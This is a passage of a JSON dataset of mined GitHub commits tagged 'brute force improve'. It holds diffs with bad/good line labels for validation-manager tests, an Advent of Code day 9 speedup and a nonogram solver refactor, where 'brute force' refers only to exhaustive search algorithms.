method.\n    \"\"\"\n\n    manager = ValidationManager(bundle, notifier=None)\n    manager.accept_rule_fn = lambda r: r.check_func is not None\n\n    success = manager.validate()\n    assert not success\n\n    # Based on the hook data and accept function, there should be only 1 error.\n    # 1. rule_2 explicitly returns not valid\n    # Note that rule_3 is ignored by the accept_rule_fn\n    assert len(manager.errors) == 1\n    assert \"rule_2\" in manager.errors\n\n\ndef test_manager_validate_successfully(bundle):\n    \"\"\"\n    Test the ValidationManager validate method.\n    \"\"\"\n\n    manager = ValidationManager(bundle, notifier=None)\n    manager.accept_rule_fn = lambda r: r.id == \"rule_1\"\n\n    success = manager.validate()\n    assert success\n    assert not manager.errors\n\n\ndef test_manager_validate_notifier_signals(bundle, notifier):\n    \"\"\"\n    Test the ValidationManager validate method.\n    \"\"\"\n\n    manager = ValidationManager(bundle, notifier=notifier)\n    manager.validate()\n\n    manager.notifier.validate_all_begin.emit.assert_called_once()\n    manager.notifier.validate_all_finished.emit.assert_called_once()\n\n    expected_calls = [call(r) for r in manager.rules]\n    manager.notifier.validate_rule_begin.emit.assert_has_calls(\n        expected_calls, any_order=True\n    )\n    manager.notifier.validate_rule_finished.emit.assert_has_calls(\n        expected_calls, any_order=True\n    )\n\n\ndef test_manager_resolve_notifier_signals(bundle, notifier):\n    \"\"\"\n    Test the ValidationManager validate method.\n    \"\"\"\n\n    manager = ValidationManager(bundle, notifier=notifier)\n    manager.accept_rule_fn = None\n\n    manager.validate()\n    expected_calls = [call(r) for r in manager.rules if not r.valid]\n\n    manager.resolve()\n\n    manager.notifier.resolve_all_begin.emit.assert_called_once()\n    manager.notifier.resolve_all_finished.emit.assert_called_once()\n\n    manager.notifier.resolve_rule_begin.emit.assert_has_calls(\n        expected_calls, any_order=True\n    )\n    manager.notifier.resolve_rule_finished.emit.assert_has_calls(\n        expected_calls, any_order=True\n    )\n\n\ndef test_manager_resolve_with_pre_validate_notifier_signals(bundle, notifier):\n    \"\"\"\n    Test the ValidationManager validate method.\n    \"\"\"\n\n    manager = ValidationManager(bundle, notifier=notifier)\n\n    manager.resolve(pre_validate=True)\n\n    manager.notifier.validate_all_begin.emit.assert_called_once()\n    manager.notifier.validate_all_finished.emit.assert_called_once()\n\n    expected_calls = [call(r) for r in manager.rules]\n    manager.notifier.validate_rule_begin.emit.assert_has_calls(\n        expected_calls, any_order=True\n    )\n    manager.notifier.validate_rule_finished.emit.assert_has_calls(\n        expected_calls, any_order=True\n    )\n"}},"msg":"[SHOT-4031] Brute force resolve all errors (#9)\n\n* Brute force keep trying to resolve all errors to handle reverse dependencies.\r\n* Update unit tests.\r\n* Improve error message reporting.\r\n* Catch any exceptions thrown during validation\/fix and report these errors to the user in a friendly way"}},"https:\/\/github.com\/jpgaul-pco\/AoC2020":{"92045b72bf2d9ca36bd7752c086b2a3410b67905":{"url":"https:\/\/api.github.com\/repos\/jpgaul-pco\/AoC2020\/commits\/92045b72bf2d9ca36bd7752c086b2a3410b67905","html_url":"https:\/\/github.com\/jpgaul-pco\/AoC2020\/commit\/92045b72bf2d9ca36bd7752c086b2a3410b67905","message":"Improve from brute force on part 1","sha":"92045b72bf2d9ca36bd7752c086b2a3410b67905","keyword":"brute force improve","diff":"diff --git a\/day9\/script.py b\/day9\/script.py\nindex 58c59c9..641fd61 100644\n--- a\/day9\/script.py\n+++ b\/day9\/script.py\n@@ -1,6 +1,9 @@\n+import bisect\n+import timeit\n+\n+\n lines = []\n preamble_len = 25\n-preamble = []\n \n \n def read_file():\n@@ -9,6 +12,7 @@ def read_file():\n \tfile.close()\n \n \n+# O(n * p^2)\n def check_pattern_bf():\n \tfor i in range(preamble_len, len(lines)):\n \t\tpreamble = lines[i-preamble_len:i]\n@@ -18,6 +22,7 @@ def check_pattern_bf():\n \treturn 0\n \n \n+# O(n^3)\n def find_target_range_bf(target_number):\n \tfor i in range(len(lines)):\n \t\tfor j in range(len(lines)):\n@@ -26,14 +31,54 @@ def find_target_range_bf(target_number):\n \treturn 0\n \n \n+# O(n * p)\n+def check_pattern():\n+\tpreamble = sorted(lines[:preamble_len])\n+\n+\tfor i in range(preamble_len, len(lines)): # O(n)\n+\t\tstart = 0\n+\t\tend = len(preamble) - 1\n+\t\twhile start < end and preamble[start] + preamble[end] != lines[i]: # O(p)\n+\t\t\tif preamble[start] + preamble[end] > lines[i]:\n+\t\t\t\tend -= 1\n+\t\t\telse:\n+\t\t\t\tstart += 1\n+\t\tif start == end:\n+\t\t\treturn lines[i]\n+\t\t\n+\t\tbisect.insort(preamble, lines[i]) # O(log(p))\n+\t\tdel preamble[bisect.bisect_left(preamble, lines[i - preamble_len])] # O(p)\n+\n+\treturn 0\n+\n+\n+def find_target_range(target_number):\n+\tfor i in range(len(lines)):\n+\t\tfor j in range(len(lines)):\n+\t\t\tif sum(lines[i:j]) == target_number:\n+\t\t\t\treturn lines[i:j]\n+\treturn 0\n+\n+\n def main(): \n \tread_file()\n \n-\tbroken_pattern = check_pattern_bf()\n-\ttarget_range = find_target_range_bf(broken_pattern)\n+\tstart_p1bf = timeit.default_timer()\n+\tbroken_pattern_bf = check_pattern_bf()\n+\ttime_p1bf = timeit.default_timer() - start_p1bf\n+\tstart_p2bf = timeit.default_timer()\n+\ttarget_range_bf = find_target_range_bf(broken_pattern_bf)\n+\ttime_p2bf = timeit.default_timer() - start_p2bf\n+\n+\tstart_p1 = timeit.default_timer()\n+\tbroken_pattern = check_pattern()\n+\ttime_p1 = timeit.default_timer() - start_p1\n+\tstart_p2 = timeit.default_timer()\n+\ttarget_range = find_target_range(broken_pattern)\n+\ttime_p2 = timeit.default_timer() - start_p2\n \n-\tprint(f\"The first number to break the pattern is {broken_pattern}.\")\n-\tprint(f\"The added min and max is {min(target_range) + max(target_range)}.\")\n+\tprint(f\"The first number to break the pattern is {broken_pattern}, speedup: {(time_p1bf \/ time_p1):.0f}x.\")\n+\tprint(f\"The added min and max is {min(target_range) + max(target_range)}, speedup: {(time_p2bf \/ time_p2):.0f}x.\")\n \n \n if __name__==\"__main__\": \n","files":{"\/day9\/script.py":{"changes":[{"diff":"\n+import bisect\n+import timeit\n+\n+\n lines = []\n preamble_len = 25\n-preamble = []\n \n \n def read_file():\n","add":4,"remove":1,"filename":"\/day9\/script.py","badparts":["preamble = []"],"goodparts":["import bisect","import timeit"]},{"diff":"\n \treturn 0\n \n \n+# O(n * p)\n+def check_pattern():\n+\tpreamble = sorted(lines[:preamble_len])\n+\n+\tfor i in range(preamble_len, len(lines)): # O(n)\n+\t\tstart = 0\n+\t\tend = len(preamble) - 1\n+\t\twhile start < end and preamble[start] + preamble[end] != lines[i]: # O(p)\n+\t\t\tif preamble[start] + preamble[end] > lines[i]:\n+\t\t\t\tend -= 1\n+\t\t\telse:\n+\t\t\t\tstart += 1\n+\t\tif start == end:\n+\t\t\treturn lines[i]\n+\t\t\n+\t\tbisect.insort(preamble, lines[i]) # O(log(p))\n+\t\tdel preamble[bisect.bisect_left(preamble, lines[i - preamble_len])] # O(p)\n+\n+\treturn 0\n+\n+\n+def find_target_range(target_number):\n+\tfor i in range(len(lines)):\n+\t\tfor j in range(len(lines)):\n+\t\t\tif sum(lines[i:j]) == target_number:\n+\t\t\t\treturn lines[i:j]\n+\treturn 0\n+\n+\n def main(): \n \tread_file()\n \n-\tbroken_pattern = check_pattern_bf()\n-\ttarget_range = find_target_range_bf(broken_pattern)\n+\tstart_p1bf = timeit.default_timer()\n+\tbroken_pattern_bf = check_pattern_bf()\n+\ttime_p1bf = timeit.default_timer() - start_p1bf\n+\tstart_p2bf = timeit.default_timer()\n+\ttarget_range_bf = find_target_range_bf(broken_pattern_bf)\n+\ttime_p2bf = timeit.default_timer() - start_p2bf\n+\n+\tstart_p1 = timeit.default_timer()\n+\tbroken_pattern = check_pattern()\n+\ttime_p1 = timeit.default_timer() - start_p1\n+\tstart_p2 = timeit.default_timer()\n+\ttarget_range = find_target_range(broken_pattern)\n+\ttime_p2 = timeit.default_timer() - start_p2\n \n-\tprint(f\"The first number to break the pattern is {broken_pattern}.\")\n-\tprint(f\"The added min and max is {min(target_range) + max(target_range)}.\")\n+\tprint(f\"The first number to break the pattern is {broken_pattern}, speedup: {(time_p1bf \/ time_p1):.0f}x.\")\n+\tprint(f\"The added min and max is {min(target_range) + max(target_range)}, speedup: {(time_p2bf \/ time_p2):.0f}x.\")\n \n \n if __name__==\"__main__\": \n","add":44,"remove":4,"filename":"\/day9\/script.py","badparts":["\tbroken_pattern = check_pattern_bf()","\ttarget_range = find_target_range_bf(broken_pattern)","\tprint(f\"The first number to break the pattern is {broken_pattern}.\")","\tprint(f\"The added min and max is {min(target_range) + max(target_range)}.\")"],"goodparts":["def check_pattern():","\tpreamble = sorted(lines[:preamble_len])","\tfor i in range(preamble_len, len(lines)): # O(n)","\t\tstart = 0","\t\tend = len(preamble) - 1","\t\twhile start < end and preamble[start] + preamble[end] != lines[i]: # O(p)","\t\t\tif preamble[start] + preamble[end] > lines[i]:","\t\t\t\tend -= 1","\t\t\telse:","\t\t\t\tstart += 1","\t\tif start == end:","\t\t\treturn lines[i]","\t\t","\t\tbisect.insort(preamble, lines[i]) # O(log(p))","\t\tdel preamble[bisect.bisect_left(preamble, lines[i - preamble_len])] # O(p)","\treturn 0","def find_target_range(target_number):","\tfor i in range(len(lines)):","\t\tfor j in range(len(lines)):","\t\t\tif sum(lines[i:j]) == target_number:","\t\t\t\treturn lines[i:j]","\treturn 0","\tstart_p1bf = timeit.default_timer()","\tbroken_pattern_bf = check_pattern_bf()","\ttime_p1bf = timeit.default_timer() - start_p1bf","\tstart_p2bf = timeit.default_timer()","\ttarget_range_bf = find_target_range_bf(broken_pattern_bf)","\ttime_p2bf = timeit.default_timer() - start_p2bf","\tstart_p1 = timeit.default_timer()","\tbroken_pattern = check_pattern()","\ttime_p1 = timeit.default_timer() - start_p1","\tstart_p2 = timeit.default_timer()","\ttarget_range = find_target_range(broken_pattern)","\ttime_p2 = timeit.default_timer() - start_p2","\tprint(f\"The first number to break the pattern is {broken_pattern}, speedup: {(time_p1bf \/ time_p1):.0f}x.\")","\tprint(f\"The added min and max is {min(target_range) + max(target_range)}, speedup: {(time_p2bf \/ time_p2):.0f}x.\")"]}],"source":"\nlines=[] preamble_len=25 preamble=[] def read_file(): \tfile=open(\"input.txt\", \"r\") \t[lines.append(int(line.strip())) for line in file] \tfile.close() def check_pattern_bf(): \tfor i in range(preamble_len, len(lines)): \t\tpreamble=lines[i-preamble_len:i] \t\tpreamble_set=set([i +j for i in preamble for j in preamble]) \t\tif not lines[i] in preamble_set: \t\t\treturn lines[i] \treturn 0 def find_target_range_bf(target_number): \tfor i in range(len(lines)): \t\tfor j in range(len(lines)): \t\t\tif sum(lines[i:j])==target_number: \t\t\t\treturn lines[i:j] \treturn 0 def main(): \tread_file() \tbroken_pattern=check_pattern_bf() \ttarget_range=find_target_range_bf(broken_pattern) \tprint(f\"The first number to break the pattern is{broken_pattern}.\") \tprint(f\"The added min and max is{min(target_range) +max(target_range)}.\") if __name__==\"__main__\": \tmain() ","sourceWithComments":"lines = []\npreamble_len = 25\npreamble = []\n\n\ndef read_file():\n\tfile = open(\"input.txt\", \"r\")\n\t[lines.append(int(line.strip())) for line in file]\n\tfile.close()\n\n\ndef check_pattern_bf():\n\tfor i in range(preamble_len, len(lines)):\n\t\tpreamble = lines[i-preamble_len:i]\n\t\tpreamble_set = set([i + j for i in preamble for j in preamble])\n\t\tif not lines[i] in preamble_set:\n\t\t\treturn lines[i]\n\treturn 0\n\n\ndef find_target_range_bf(target_number):\n\tfor i in range(len(lines)):\n\t\tfor j in range(len(lines)):\n\t\t\tif sum(lines[i:j]) == target_number:\n\t\t\t\treturn lines[i:j]\n\treturn 0\n\n\ndef main(): \n\tread_file()\n\n\tbroken_pattern = check_pattern_bf()\n\ttarget_range = find_target_range_bf(broken_pattern)\n\n\tprint(f\"The first number to break the pattern is {broken_pattern}.\")\n\tprint(f\"The added min and max is {min(target_range) + max(target_range)}.\")\n\n\nif __name__==\"__main__\": \n\tmain()\n"}},"msg":"Improve from brute force on part 1"}},"https:\/\/github.com\/razv2004\/griddler":{"906dbb0d89a4783acfaedf27633fd7418490e0e7":{"url":"https:\/\/api.github.com\/repos\/razv2004\/griddler\/commits\/906dbb0d89a4783acfaedf27633fd7418490e0e7","html_url":"https:\/\/github.com\/razv2004\/griddler\/commit\/906dbb0d89a4783acfaedf27633fd7418490e0e7","message":"Under 1 second!\n\nImproved:\r\n1. Removed weights\r\n2. Ordered the jobs (exploiting non-brute-force and only then trying brute-force)\r\n3. Identifying blocks and splitting the work to two parts","sha":"906dbb0d89a4783acfaedf27633fd7418490e0e7","keyword":"brute force improve","diff":"diff --git a\/griddler.py b\/griddler.py\nindex 56fe7ce..16e3cec 100644\n--- a\/griddler.py\n+++ b\/griddler.py\n@@ -3,67 +3,115 @@\n import math\n import random\n from itertools import combinations\n-\n-TWO = np.array([2])\n+import copy\n \n \n class Griddler:\n     def __init__(self, blx_x, blx_y):\n         self.blx_x = blx_x\n         self.blx_y = blx_y\n+        if sum(sum(self.blx_x, [])) != sum(sum(self.blx_y, [])):\n+            raise Exception(\"Sum mismatch\")\n+\n         self.n = len(blx_x)\n         self.m = len(blx_y)\n         self.data = np.zeros([self.n, self.m])\n-        self.sums = [np.zeros(self.n), np.zeros(self.m)]\n         self.max_combination = 10\n         self.jobs = {}\n+        self.bf_jobs = {}\n+        self.future_bf_jobs = {}\n+        self.empty_jobs = self.empty_jobs(self.n, self.m)\n+        self.init_jobs(True)\n+        self.key = (-1, -1)\n+        self.use_bf = False\n \n-    def solve(self):\n-        if sum(sum(self.blx_x, [])) != sum(sum(self.blx_y, [])):\n-            raise Exception(\"Sum mismatch\")\n+    def print(self):\n+        for i in range(self.n):\n+            print(''.join({0: '___', 1: 'XXX', 2: '   '}.get(self.data[i, j]) for j in range(self.m)))\n+        print()\n+\n+    @staticmethod\n+    def empty_jobs(n, m):\n+        res = {}\n+        for i in range(n):\n+            res[(0, i)] = 0\n+\n+        for j in range(m):\n+            res[(1, j)] = 0\n+        return res\n+\n+    def init_jobs(self, first_time):\n+        self.bf_jobs = self.future_bf_jobs\n+        self.future_bf_jobs = copy.deepcopy(self.empty_jobs)\n \n+        if first_time:\n+            for i in range(self.n):\n+                self.jobs[(0, i)] = 1\n+                self.future_bf_jobs[(0, i)] = 0\n+                self.bf_jobs[(0, i)] = 0\n+\n+            for j in range(self.m):\n+                self.jobs[(1, j)] = 1\n+                self.future_bf_jobs[(1, j)] = 0\n+                self.bf_jobs[(1, j)] = 0\n+\n+    def solve(self):\n         while (self.data == 0).any():\n             print(f\"Starting. max_combinations={self.max_combination}\")\n             self.solve_loop()\n             # self.print()\n-            self.max_combination *= 10\n+            self.max_combination *= 1.5\n \n     def solve_loop(self):\n-        self.jobs = self.init_jobs()\n-        while len(self.jobs) > 0:\n-            max_key = max(self.jobs, key=self.jobs.get)\n-            if self.jobs[max_key] <= 0:\n-                break\n+        self.init_jobs(False)\n+        while True:\n+            self.use_bf = False\n+            self.key = max(self.jobs, key=self.jobs.get)\n+            if self.jobs[self.key] > 0:\n+                self.jobs[self.key] = 0\n+            else:\n+                self.use_bf = True\n+                self.key = max(self.bf_jobs, key=self.bf_jobs.get)\n+                if self.bf_jobs[self.key] > 0:\n+                    self.bf_jobs[self.key] = 0\n+                else:\n+                    return\n \n-            self.jobs[max_key] = 0\n-            (is_col, idx, use_brute_force) = max_key\n+            (is_col, idx) = self.key\n \n             if is_col:\n-                self.solve_line(self.data[:, idx], self.blx_y[idx], 0, use_brute_force)\n+                self.solve_line(self.data[:, idx], self.blx_y[idx])\n             else:\n-                self.solve_line(self.data[idx, :], self.blx_x[idx], 1, use_brute_force)\n+                self.solve_line(self.data[idx, :], self.blx_x[idx])\n \n-    def init_jobs(self):\n-        jobs = {}\n-        for i in range(self.n):\n-            jobs[(0, i, False)] = 100 \/ self.weight(self.sums[0][i])\n-            jobs[(0, i, True)] = 1 \/ self.weight(self.sums[0][i])\n+    def solve_line(self, line_data, line_blx):\n+        if (line_data != 0).all():\n+            return\n \n-        for j in range(self.m):\n-            jobs[(1, j, False)] = 100 \/ self.weight(self.sums[1][j])\n-            jobs[(1, j, True)] = 1 \/ self.weight(self.sums[1][j])\n-        return jobs\n+        (a_idx, a_blx) = self.pfx(line_data, line_blx)\n+        (z_idx, z_blx) = self.sfx(line_data, line_blx)\n+        if a_blx >= z_blx:\n+            if a_idx < z_idx:\n+                self.update(line_data, 2, a_idx, z_idx - a_idx)\n+            return\n+        if a_idx >= z_idx:\n+            return\n \n-    @staticmethod\n-    def weight(s):\n-        return math.pow(2, s + 1)\n+        if not line_data[a_idx:z_idx].any():\n+            self.use_bf = False\n \n-    def print(self):\n-        for i in range(self.n):\n-            print(''.join({0: '___', 1: 'XXX', 2: '   '}.get(self.data[i, j]) for j in range(self.m)))\n-        print()\n+        self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)\n \n-    def update(self, old_line, new_value, a_idx, n_idx, other_is_row):\n+        if self.use_bf:\n+            located_blx = self.locate_blx(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)\n+            if len(located_blx) > 0:\n+                for idx, blx in located_blx.items():\n+                    self.bf(line_data, line_blx, a_idx, idx - 1, a_blx, blx)\n+                    self.bf(line_data, line_blx, idx + line_blx[blx], z_idx, blx + 1, z_blx)\n+            else:\n+                self.bf(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)\n+\n+    def update(self, old_line, new_value, a_idx, n_idx):\n         if n_idx < 0 or a_idx + n_idx > len(old_line):\n             raise Exception(\"Invalid\")\n         if n_idx == 0:\n@@ -71,73 +119,40 @@ def update(self, old_line, new_value, a_idx, n_idx, other_is_row):\n         diffs = list(np.nonzero(old_line[a_idx:a_idx + n_idx] != new_value)[0])\n         if len(diffs) > 0:\n             old_line[a_idx:a_idx + n_idx] = new_value\n+            # self.bf_jobs[self.key] += 1\n             for idx in diffs:\n-                self.sums[other_is_row][a_idx + idx] += 1\n-                self.jobs[(other_is_row, a_idx + idx, False)] += 100 \/ self.weight(self.sums[other_is_row][a_idx + idx])\n-                self.jobs[(other_is_row, a_idx + idx, True)] += 1 \/ self.weight(self.sums[other_is_row][a_idx + idx])\n+                self.jobs[(1 - self.key[0], a_idx + idx)] += 1\n+                self.bf_jobs[(1 - self.key[0], a_idx + idx)] += 1\n \n-    @staticmethod\n-    def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time):\n-        if np.logical_and(old_line[a_idx:a_idx+n_idx] != 0, old_line[a_idx:a_idx+n_idx] != new_line[:n_idx]).any():\n-            return True  # still first time\n+    def pfx(self, line_data, line_blx):\n+        return self.pfx_internal(line_data, line_blx, 0, 0)\n \n-        if first_time:\n-            agg_line[:] = new_line[:]\n-        else:\n-            agg_line[new_line != agg_line] = 0\n-        return False\n-\n-    def solve_line(self, line_data, line_blx, other_is_row, use_brute_force):\n-        grayed = np.nonzero(line_data == 0)\n-        if len(grayed[0]) == 0:\n-            return\n-\n-        (a_idx, a_blx) = self.pfx(line_data, line_blx, other_is_row)\n-        (z_idx, z_blx) = self.sfx(line_data, line_blx, other_is_row)\n-        if a_blx >= z_blx:\n-            if a_idx < z_idx:\n-                self.update(line_data, 2, a_idx, z_idx - a_idx, other_is_row)\n-            return\n-        if a_idx >= z_idx:\n-            return\n-\n-        self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)\n-        if use_brute_force:\n-            self.brute_force(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)\n-\n-    def pfx(self, line_data, line_blx, other_is_row):\n-        return self.pfx_internal(line_data, line_blx, 0, 0, other_is_row)\n-\n-    def sfx(self, line_data, line_blx, other_is_row):\n-        (z_idx_inv, z_blx_inv) = self.pfx_internal(np.flip(line_data), list(reversed(line_blx)), 0, 0, other_is_row)\n-        return len(line_data) - z_idx_inv, len(line_blx) - z_blx_inv\n-\n-    def pfx_internal(self, line_data, line_blx, a_idx, a_blx, other_is_row):\n+    def pfx_internal(self, line_data, line_blx, a_idx, a_blx):\n         n_idx = len(line_data) - a_idx\n         n_blx = len(line_blx) - a_blx\n \n         if n_idx == 0:  # no line data\n             return a_idx, a_blx\n-    \n+\n         if n_blx == 0:  # no more blx\n-            self.update(line_data, 2, a_idx, n_idx, other_is_row)\n+            self.update(line_data, 2, a_idx, n_idx)\n             return a_idx+n_idx, a_blx+n_blx\n \n         current_blx = line_blx[a_blx]\n \n         if line_data[a_idx] == 1:\n-            self.update(line_data, 1, a_idx, current_blx, other_is_row)\n+            self.update(line_data, 1, a_idx, current_blx)\n             a_idx += current_blx\n             a_blx += 1\n             if len(line_data) > a_idx:\n-                self.update(line_data, 2, a_idx, 1, other_is_row)\n+                self.update(line_data, 2, a_idx, 1)\n                 a_idx += 1\n-            return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)\n+            return self.pfx_internal(line_data, line_blx, a_idx, a_blx)\n         elif line_data[a_idx] == 2:\n             maybe_black = np.nonzero(line_data[a_idx:] != 2)\n             if len(maybe_black[0]) > 0:\n                 a_idx = maybe_black[0][0] + a_idx\n-                return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)\n+                return self.pfx_internal(line_data, line_blx, a_idx, a_blx)\n             else:\n                 raise Exception(\"Shouldn't get here\")\n         else:\n@@ -146,10 +161,49 @@ def pfx_internal(self, line_data, line_blx, a_idx, a_blx, other_is_row):\n                 first_blacked = blacked[0][0]\n                 overflow = current_blx - first_blacked\n                 if overflow > 0:\n-                    self.update(line_data, 1, a_idx + first_blacked, overflow, other_is_row)\n+                    self.update(line_data, 1, a_idx + first_blacked, overflow)\n             return a_idx, a_blx\n \n-    def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):\n+    def sfx(self, line_data, line_blx):\n+        return self.sfx_internal(line_data, line_blx, len(line_data), len(line_blx))\n+\n+    def sfx_internal(self, line_data, line_blx, z_idx, z_blx):\n+        n_idx = z_idx\n+        n_blx = z_blx\n+\n+        if n_idx == 0:  # no line data\n+            return z_idx, z_blx\n+\n+        if n_blx == 0:  # no more blx\n+            self.update(line_data, 2, z_idx - n_idx, n_idx)\n+            return z_idx - n_idx, z_blx - n_blx\n+\n+        current_blx = line_blx[z_blx - 1]\n+\n+        if line_data[z_idx - 1] == 1:\n+            self.update(line_data, 1, z_idx - current_blx, current_blx)\n+            z_idx -= current_blx\n+            z_blx -= 1\n+            if 0 < z_idx:\n+                self.update(line_data, 2, z_idx - 1, 1)\n+                z_idx -= 1\n+            return self.sfx_internal(line_data, line_blx, z_idx, z_blx)\n+        elif line_data[z_idx - 1] == 2:\n+            maybe_black = np.nonzero(line_data[:z_idx] != 2)\n+            if len(maybe_black[0]) > 0:\n+                z_idx = maybe_black[0][-1] + 1\n+                return self.sfx_internal(line_data, line_blx, z_idx, z_blx)\n+            else:\n+                raise Exception(\"Shouldn't get here\")\n+        else:\n+            blacked = np.nonzero(line_data[z_idx - current_blx:z_idx] == 1)\n+            if len(blacked[0]) > 0 and 0 <= blacked[0][-1] < current_blx:\n+                last_blacked = blacked[0][-1]\n+                if last_blacked > 0:\n+                    self.update(line_data, 1, z_idx - current_blx, last_blacked + 1)\n+            return z_idx, z_blx\n+\n+    def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx):\n         n_idx = z_idx - a_idx\n         freedom = n_idx - sum(blx + 1 for blx in line_blx[a_blx:z_blx]) + 1\n         if freedom < max(line_blx[a_blx:z_blx]):\n@@ -157,15 +211,54 @@ def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_i\n             for blx in line_blx[a_blx:z_blx]:\n                 blacks = blx - freedom\n                 if blacks > 0:\n-                    self.update(line_data, 1, idx + freedom, blacks, other_is_row)\n+                    self.update(line_data, 1, idx + freedom, blacks)\n                 idx = idx + blx + 1\n \n-    def brute_force(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):\n+    @staticmethod\n+    def locate_blx(line_data, line_blx, a_idx, z_idx, a_blx, z_blx):\n+        empty = False\n+        white = False\n+        blacks = 0\n+        suspects = {}\n+        located_blocks = {}\n+        for idx in range(a_idx, z_idx):\n+            if line_data[idx] == 0:\n+                empty = True\n+                white = False\n+                blacks = 0\n+            elif empty and not white and line_data[idx] == 2:\n+                empty = False\n+                white = True\n+                blacks = 0\n+            elif white and blacks == 0 and line_data[idx] == 1:\n+                blacks = 1\n+                white = False\n+                empty = False\n+            elif blacks > 0 and line_data[idx] == 1:\n+                blacks += 1\n+                white = False\n+                empty = False\n+            elif blacks > 0 and line_data[idx] == 2:\n+                suspects[idx - blacks] = blacks\n+                blacks = 0\n+                empty = False\n+                white = True\n+\n+        if len(suspects) > 0:\n+            for idx, blx in suspects.items():\n+                if blx in line_blx[a_blx:z_blx]:\n+                    if line_blx[a_blx:z_blx].count(blx) == 1:\n+                        blx_idx = line_blx[a_blx:z_blx].index(blx)\n+                        located_blocks[idx] = a_blx + blx_idx\n+        return located_blocks\n+\n+    def bf(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx):\n         n_idx = z_idx - a_idx\n         n_blx = z_blx - a_blx\n         freedom = n_idx - sum(blx + 1 for blx in line_blx[a_blx:z_blx]) + 1\n         possibilities = math.comb(freedom + n_blx, n_blx)\n         if possibilities > self.max_combination:\n+            self.future_bf_jobs[self.key] += 1\n             return\n \n         agg_line = np.zeros(n_idx)\n@@ -180,19 +273,31 @@ def brute_force(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_\n             for i in range(freedom + n_blx):\n                 if i in combo:\n                     blx_len = line_blx[blx]\n-                    new_line[idx:idx + blx_len] = np.ones(blx_len)\n+                    new_line[idx:idx + blx_len].fill(1)\n                     idx += blx_len\n                     blx += 1\n                 new_line[idx] = 2\n                 idx += 1\n             new_line = new_line[:-1]\n             first_time = self.update_soft(line_data, agg_line, new_line, a_idx, n_idx, first_time) and first_time\n-            if not first_time and not agg_line.any():\n-                break\n+            if not first_time and (agg_line == line_data[a_idx:z_idx]).all():\n+                return\n         if first_time:\n             raise Exception(\"Dead end\")\n \n-        return self.update(line_data, agg_line, a_idx, n_idx, other_is_row)\n+        self.update(line_data, agg_line, a_idx, n_idx)\n+\n+    @staticmethod\n+    def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time):\n+        if np.logical_and(old_line[a_idx:a_idx + n_idx] != 0, old_line[a_idx:a_idx + n_idx] != new_line).any():\n+            return True  # still first time\n+\n+        if first_time:\n+            agg_line[:] = new_line\n+        else:\n+            agg_line[new_line != agg_line] = 0\n+        return False\n+\n \n def test():\n     blx_x = [[1, 1], [1, 16], [19], [9], [2, 4],\n","files":{"\/griddler.py":{"changes":[{"diff":"\n import math\n import random\n from itertools import combinations\n-\n-TWO = np.array([2])\n+import copy\n \n \n class Griddler:\n     def __init__(self, blx_x, blx_y):\n         self.blx_x = blx_x\n         self.blx_y = blx_y\n+        if sum(sum(self.blx_x, [])) != sum(sum(self.blx_y, [])):\n+            raise Exception(\"Sum mismatch\")\n+\n         self.n = len(blx_x)\n         self.m = len(blx_y)\n         self.data = np.zeros([self.n, self.m])\n-        self.sums = [np.zeros(self.n), np.zeros(self.m)]\n         self.max_combination = 10\n         self.jobs = {}\n+        self.bf_jobs = {}\n+        self.future_bf_jobs = {}\n+        self.empty_jobs = self.empty_jobs(self.n, self.m)\n+        self.init_jobs(True)\n+        self.key = (-1, -1)\n+        self.use_bf = False\n \n-    def solve(self):\n-        if sum(sum(self.blx_x, [])) != sum(sum(self.blx_y, [])):\n-            raise Exception(\"Sum mismatch\")\n+    def print(self):\n+        for i in range(self.n):\n+            print(''.join({0: '___', 1: 'XXX', 2: '   '}.get(self.data[i, j]) for j in range(self.m)))\n+        print()\n+\n+    @staticmethod\n+    def empty_jobs(n, m):\n+        res = {}\n+        for i in range(n):\n+            res[(0, i)] = 0\n+\n+        for j in range(m):\n+            res[(1, j)] = 0\n+        return res\n+\n+    def init_jobs(self, first_time):\n+        self.bf_jobs = self.future_bf_jobs\n+        self.future_bf_jobs = copy.deepcopy(self.empty_jobs)\n \n+        if first_time:\n+            for i in range(self.n):\n+                self.jobs[(0, i)] = 1\n+                self.future_bf_jobs[(0, i)] = 0\n+                self.bf_jobs[(0, i)] = 0\n+\n+            for j in range(self.m):\n+                self.jobs[(1, j)] = 1\n+                self.future_bf_jobs[(1, j)] = 0\n+                self.bf_jobs[(1, j)] = 0\n+\n+    def solve(self):\n         while (self.data == 0).any():\n             print(f\"Starting. max_combinations={self.max_combination}\")\n             self.solve_loop()\n             # self.print()\n-            self.max_combination *= 10\n+            self.max_combination *= 1.5\n \n     def solve_loop(self):\n-        self.jobs = self.init_jobs()\n-        while len(self.jobs) > 0:\n-            max_key = max(self.jobs, key=self.jobs.get)\n-            if self.jobs[max_key] <= 0:\n-                break\n+        self.init_jobs(False)\n+        while True:\n+            self.use_bf = False\n+            self.key = max(self.jobs, key=self.jobs.get)\n+            if self.jobs[self.key] > 0:\n+                self.jobs[self.key] = 0\n+            else:\n+                self.use_bf = True\n+                self.key = max(self.bf_jobs, key=self.bf_jobs.get)\n+                if self.bf_jobs[self.key] > 0:\n+                    self.bf_jobs[self.key] = 0\n+                else:\n+                    return\n \n-            self.jobs[max_key] = 0\n-            (is_col, idx, use_brute_force) = max_key\n+            (is_col, idx) = self.key\n \n             if is_col:\n-                self.solve_line(self.data[:, idx], self.blx_y[idx], 0, use_brute_force)\n+                self.solve_line(self.data[:, idx], self.blx_y[idx])\n             else:\n-                self.solve_line(self.data[idx, :], self.blx_x[idx], 1, use_brute_force)\n+                self.solve_line(self.data[idx, :], 